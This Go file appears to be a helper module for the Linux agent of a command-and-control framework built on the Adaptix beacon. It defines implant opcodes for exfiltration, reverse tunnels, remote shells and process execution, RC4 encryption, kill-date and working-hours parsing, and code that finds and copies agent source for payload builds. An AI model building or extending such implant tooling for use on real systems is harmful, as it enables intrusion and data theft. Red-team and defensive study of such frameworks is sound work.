package main

import (
	"crypto/rc4"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

// Command opcodes - byte identical to the Adaptix beacon for 0..74 and the
// 0x8xxx / 0x1111xxxx sentinels. 100..107 are the Jinxed Linux extensions.
const (
	COMMAND_CAT       = 24
	COMMAND_CD        = 8
	COMMAND_COPY      = 12
	COMMAND_DISKS     = 15
	COMMAND_DOWNLOAD  = 32
	COMMAND_EXFIL     = 35
	COMMAND_GETUID    = 22
	COMMAND_JOBS_KILL = 47
	COMMAND_JOB_LIST  = 46
	COMMAND_LS        = 14
	COMMAND_MKDIR     = 27
	COMMAND_MV        = 18
	COMMAND_PROFILE   = 21
	COMMAND_PS_LIST   = 41
	COMMAND_PS_KILL   = 42
	COMMAND_PS_RUN    = 43
	COMMAND_PWD       = 4
	COMMAND_RM        = 17
	COMMAND_TERMINATE = 10
	COMMAND_UPLOAD    = 33

	COMMAND_TUNNEL_START_TCP = 62
	COMMAND_TUNNEL_START_UDP = 63
	COMMAND_TUNNEL_WRITE_TCP = 64
	COMMAND_TUNNEL_WRITE_UDP = 65
	COMMAND_TUNNEL_CLOSE     = 66
	COMMAND_TUNNEL_REVERSE   = 67
	COMMAND_TUNNEL_ACCEPT    = 68
	COMMAND_TUNNEL_PAUSE     = 69
	COMMAND_TUNNEL_RESUME    = 70

	COMMAND_SHELL_START  = 71
	COMMAND_SHELL_WRITE  = 72
	COMMAND_SHELL_CLOSE  = 73
	COMMAND_SHELL_ACCEPT = 74

	COMMAND_JOB        = 0x8437
	COMMAND_SAVEMEMORY = 0x2321
	COMMAND_ERROR      = 0x1111ffff

	COMMAND_ENV      = 100
	COMMAND_NETSTAT  = 101
	COMMAND_IFCONFIG = 102
	COMMAND_SERVICE  = 103
	COMMAND_UNAME    = 104
	COMMAND_CHMOD    = 105
	COMMAND_USERS    = 106
	COMMAND_SYSINFO  = 107
)

const (
	DOWNLOAD_START    = 0x1
	DOWNLOAD_CONTINUE = 0x2
	DOWNLOAD_FINISH   = 0x3
)

const (
	JOB_TYPE_LOCAL   = 0x1
	JOB_TYPE_REMOTE  = 0x2
	JOB_TYPE_PROCESS = 0x3
	JOB_TYPE_SHELL   = 0x4
)

const (
	JOB_STATE_STARTING = 0x0
	JOB_STATE_RUNNING  = 0x1
	JOB_STATE_FINISHED = 0x2
	JOB_STATE_KILLED   = 0x3
)

// RC4Crypt is the framework's only symmetric primitive.
func RC4Crypt(data []byte, key []byte) ([]byte, error) {
	c, err := rc4.NewCipher(key)
	if err != nil {
		return nil, errors.New("rc4 crypt error")
	}
	out := make([]byte, len(data))
	c.XORKeyStream(out, data)
	return out, nil
}

func parseDurationToSeconds(input string) (int, error) {
	re := regexp.MustCompile(`(\d+)(h|m|s)`)
	matches := re.FindAllStringSubmatch(input, -1)
	if len(matches) != 0 {
		total := 0
		for _, m := range matches {
			value, _ := strconv.Atoi(m[1])
			switch m[2] {
			case "h":
				total += value * 3600
			case "m":
				total += value * 60
			case "s":
				total += value
			}
		}
		return total, nil
	}

	seconds, err := strconv.Atoi(strings.TrimSpace(input))
	if err != nil || seconds < 0 {
		return 0, errors.New("sleep must be in '%h%m%s' format or number of seconds")
	}
	return seconds, nil
}

// parseStringToWorkingTime encodes "HH:mm-HH:mm" into the same packed integer
// the teamserver and the Windows beacon use:
//
//	bits 31..24 start hour, 23..16 start minute, 15..8 end hour, 7..0 end minute
func parseStringToWorkingTime(value string) (int, error) {
	if value == "" {
		return 0, nil
	}
	match, err := regexp.MatchString(`^[012]?[0-9]:[0-6][0-9]-[012]?[0-9]:[0-6][0-9]$`, value)
	if err != nil || !match {
		return 0, errors.New("failed to parse working time: invalid format (use HH:mm-HH:mm)")
	}

	parts := strings.Split(value, "-")
	start := strings.Split(parts[0], ":")
	end := strings.Split(parts[1], ":")

	startHour, _ := strconv.Atoi(start[0])
	startMin, _ := strconv.Atoi(start[1])
	endHour, _ := strconv.Atoi(end[0])
	endMin, _ := strconv.Atoi(end[1])

	if startHour > 24 || endHour > 24 || startMin > 60 || endMin > 60 {
		return 0, errors.New("failed to parse working time: time out of range")
	}
	if endHour < startHour || (startHour == endHour && endMin <= startMin) {
		return 0, errors.New("failed to parse working time: end cannot precede start")
	}

	packed := 0
	packed |= startHour << 24
	packed |= startMin << 16
	packed |= endHour << 8
	packed |= endMin
	return packed, nil
}

func parseKillDate(date, clock string) (int, error) {
	if date == "" {
		return 0, errors.New("kill date is not set")
	}
	t, err := time.Parse("02.01.2006 15:04:05", date+" "+clock)
	if err != nil {
		return 0, errors.New("invalid date format, use 'DD.MM.YYYY hh:mm:ss'")
	}
	return int(t.Unix()), nil
}

func sizeBytesToFormat(size int64) string {
	const (
		kb = 1024.0
		mb = kb * 1024
		gb = mb * 1024
	)
	f := float64(size)
	switch {
	case f >= gb:
		return fmt.Sprintf("%.2f Gb", f/gb)
	case f >= mb:
		return fmt.Sprintf("%.2f Mb", f/mb)
	case f >= kb:
		return fmt.Sprintf("%.2f Kb", f/kb)
	default:
		return fmt.Sprintf("%d B", size)
	}
}

// posixErrString renders a Linux errno the way TsWin32Error renders a Win32
// code, so COMMAND_ERROR messages are readable for POSIX agents.
func posixErrString(code int) string {
	if code == 0 {
		return "success"
	}
	return syscall.Errno(code).Error()
}

// goByteLiteral converts arbitrary bytes into a Go composite literal body.
func goByteLiteral(data []byte) string {
	var b strings.Builder
	b.Grow(len(data)*6 + 16)
	for i, v := range data {
		if i%16 == 0 {
			b.WriteString("\n\t")
		}
		fmt.Fprintf(&b, "0x%02x, ", v)
	}
	return b.String()
}

// findAgentSource locates the Linux agent source tree that BuildPayload copies
// and compiles. ModuleDir is the directory containing config.yaml/the .so.
func findAgentSource(moduleDir string) (string, error) {
	var candidates []string
	if env := os.Getenv("JINXED_AGENT_SRC"); env != "" {
		candidates = append(candidates, env)
	}
	candidates = append(candidates,
		filepath.Join(moduleDir, "src_agent"),
		filepath.Join(moduleDir, "..", "agent"),
		filepath.Join(moduleDir, "..", "src", "agent"),
		filepath.Join(moduleDir, "..", "..", "src", "agent"),
	)

	for _, dir := range candidates {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err != nil {
			continue
		}
		if _, err := os.Stat(filepath.Join(dir, "main.go")); err != nil {
			continue
		}
		abs, err := filepath.Abs(dir)
		if err != nil {
			continue
		}
		return abs, nil
	}
	return "", fmt.Errorf("agent source not found (looked in %s); set JINXED_AGENT_SRC", strings.Join(candidates, ", "))
}

// copyTree copies a source tree, skipping VCS metadata and build artefacts.
func copyTree(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		if rel == "." {
			return os.MkdirAll(dst, 0755)
		}

		base := filepath.Base(path)
		if info.IsDir() {
			switch base {
			case ".git", ".idea", ".vscode", "dist", "build":
				return filepath.SkipDir
			}
			return os.MkdirAll(filepath.Join(dst, rel), info.Mode().Perm())
		}

		switch {
		case strings.HasSuffix(base, ".exe"), strings.HasSuffix(base, ".so"),
			strings.HasSuffix(base, ".test"), base == "agent":
			return nil
		}

		in, err := os.Open(path)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.OpenFile(filepath.Join(dst, rel), os.O_CREATE|os.O_WRONLY|os.O_TRUNC, info.Mode().Perm())
		if err != nil {
			return err
		}
		if _, err := io.Copy(out, in); err != nil {
			_ = out.Close()
			return err
		}
		return out.Close()
	})
}

func formatUnixTime(ts int64) string {
	t := time.Unix(ts, 0)
	return t.Format("02/01/2006 15:04")
}

// fileModeString renders a POSIX st_mode value the way `ls -l` does.
func fileModeString(mode uint32) string {
	return os.FileMode(mode).String()
}
